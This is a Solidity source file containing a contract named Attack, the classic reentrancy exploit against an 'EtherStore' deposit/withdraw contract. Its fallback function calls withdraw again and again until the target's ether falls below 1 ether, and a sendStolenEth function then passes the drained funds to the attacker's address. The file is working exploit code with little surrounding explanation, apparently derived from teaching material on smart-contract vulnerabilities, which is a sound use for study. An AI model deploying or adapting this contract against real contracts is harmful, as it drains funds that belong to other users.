// SPDX-License-Identifier: MIT

pragma solidity  ^0.8.17;

interface EtherStore {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint);
}

contract Attack {
    EtherStore public etherStore;
    address public owner ;
    constructor(address _etherStoreAddress) {
        owner = msg.sender;
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function sendStolenEth() external payable{
        require(msg.sender == owner,"not owner");
        (bool tx,) = owner.call{value:address(this).balance}("");
        require(tx);
    }
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}